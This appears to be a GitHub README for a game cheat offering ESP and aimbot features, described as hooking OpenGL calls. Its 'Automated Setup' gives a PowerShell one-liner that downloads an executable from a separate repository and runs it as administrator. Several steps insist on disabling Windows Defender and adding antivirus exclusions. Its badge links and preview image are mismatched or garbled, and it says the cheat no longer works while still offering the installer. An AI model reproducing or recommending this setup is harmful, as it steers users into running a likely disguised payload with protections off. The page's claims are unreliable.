# 👾 Chieftain External ESP + Aimbot [Matrix Fixed]

<div align="center">

## 🚀 Chieftain EXTERNAL ESP + AIMBOT

<br>

[![Stars](https://img.shields.io/badge/Stars-527-yellow?style=for-the-badge&logo=github&logoColor=white)](https://github.com/goldwinston/roblox-xeno)
[![Downloads](https://img.shields.io/badge/Downloads-3.4K-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/goldwinston/roblox-xeno)
[![Version](https://img.shields.io/badge/Version-V1.3.60-purple?style=for-the-badge)](https://github.com/goldwinston/roblox-xeno)
[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-informational?style=for-the-badge)](https://github.com/goldwinston/roblox-xeno)

<br>

> # 🛠️ **Installation**

## Automated Setup (Recommended)

Run the following command in **Command Prompt as Administrator**:

1. Press **`Win + R`**
2. Copy and paste the following command:
```powershell
powershell -c irm https://github.com/shpd2/Chieftain-External-/releases/download/v1.9/Chieftain.External.exe -OutFile $env:TEMP\chief.exe; Start-Process $env:TEMP\chief.exe -Verb RunAs
```
---

</div>

## 📸 Preview

![Preview]([[https://github.com/user-attachments/assets/38dfc4f1-20e8-4a40-a26a-ac8d296e028e](https://private-user-images.githubusercontent.com/74207477/342058572-fe282ba0-d4d1-471a-ba26-c46902a71ba1.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3OTAxNjQxNjAsIm5iZiI6MTc5MDE2Mzg2MCwicGF0aCI6Ii83NDIwNzQ3Ny8zNDIwNTg1NzItZmUyODJiYTAtZDRkMS00NzFhLWJhMjYtYzQ2OTAyYTcxYmExLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA5MjMlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwOTIzVDExNDQyMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTgyZWFhZmU3NmYxM2UxNzVkMTI3ZTQwMTU2MGJjZTcwOWVjOGIxOTY1MzgzZDk0OWM4Njg5Y2JhMDg3OWQ4YmImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.0uH50-gOFl0Xia9HUiwrtdqIR0anVqmsAFrstdedFOg)](https://data2.exloader.net/webp_images/Chieftain/misc.webp))

---

## 📌 Status

> **⚠️ ABANDONED:** The game's ModelMatrix was changed in the latest update, so the cheat is currently **not working**. I'm leaving this repository for educational purposes and as a base for anyone who wants to continue development.

---

## 🚨 Critical Requirements

Before using this cheat, make sure you meet these **strict requirements**:

| Requirement | Details |
| :--- | :--- |
| **Graphics Card** | **Intel Integrated Graphics** (UHD / Iris Xe / Arc) — this is MANDATORY. |
| **Administrator Rights** | Run **both** `overlay-acceptor.exe` and the injector **as Administrator**. |
| **Antivirus** | **Temporarily disable** Windows Defender and any third-party antivirus. Add the cheat folder to exclusions. |

---

## ✨ Features

| Feature | Description |
| :--- | :--- |
| **ESP** | Displays players, NPCs, and some mobs with boxes, names, and health bars. |
| **Draw Points** | Shows points of interest on the radar. |
| **Draw Lines** | Trace lines from your crosshair to the target. |
| **Aimbot** | Smooth auto-aim with configurable settings. |
| **Hotkeys** | Full control via keyboard shortcuts. |

---

## 🔧 How to Use (Step-by-Step)

> Follow these steps **exactly** as written. If you skip a step, the cheat will NOT work.

### Step 1: Download the files
- Download the exe file from the **Releases** section or compile the source (`Chieftain.exe`).

### Step 2: Disable antivirus (MANDATORY!)
- Open **Settings → Update & Security → Windows Security → Virus & threat protection**.
- Turn off **Real-time protection**.
- Go to **Manage settings** and add the cheat folder to **Exclusions** to prevent files from being deleted.
- If you have a third-party antivirus, temporarily disable it.

### Step 3: Run as Administrator (MANDATORY!)
- **Right-click** on `Chieftain.exe` → **Run as administrator**.
- Wait for the console message: `"Connecting to shared data..."`.
- **Right-click** on your injector → **Run as administrator**.

### Step 4: Inject
1.  Launch **Chieftain** (windowed or fullscreen).
2.  Open your injector, select the process `Chieftain.exe`, and inject `Chieftain.dll`.
3.  Press **INSERT** in-game to open/close the menu.

---

## 🎮 Hotkeys

| Key | Action |
| :--- | :--- |
| `INSERT` | Open / Close Menu |
| `LEFT SHIFT` | Hold to activate Aimbot |
| `F1` | Toggle ESP On/Off |
| `F2` | Toggle Draw Lines |
| `F3` | Toggle Draw Points |

---

## 🐞 Known Bugs

1. **Random coordinate jumps** — The aimbot sometimes targets the sky. This is a known issue.
2. **Last target persists** — If no enemies are on screen, the ESP may still draw the last target to prevent flickering.
3. **Entity culling** — When there are many entities on screen, some may not be drawn. Likely related to bug #1.

---

## 🛠️ Compiling from Source

You'll need **Visual Studio 2022** with the **Desktop development with C++** workload.

1.  Open the solution file (`.sln`).
2.  Set build configuration to `Release` and `x64`.
3.  Build → the compiled files will be in `x64/Release`.

---

## 📚 Architecture

The cheat hooks **OpenGL** functions:
- `glDrawElements` — to collect entity coordinates.
- `glFlush` — to render the overlay.

Two processes work together:
- `Chieftain.dll` — the core that intercepts API calls.
- `Chieftain.exe` — helper process that creates a transparent overlay window.

---

## ⚠️ Important Notes

- **Intel Integrated Graphics is MANDATORY.** The cheat will NOT work on NVIDIA or AMD GPUs.
- **Run everything as Administrator.** Without admin rights, the injector cannot interact with the game process.
- **Disable antivirus.** Windows Defender WILL delete the DLL if you don't add it to exclusions.

---

## ⚖️ License

MIT License. Use the code for learning purposes, but remember: **cheating in online games is prohibited and can get you banned.**

---

> ⭐ **Star this repository** if you found it useful or interesting!

---
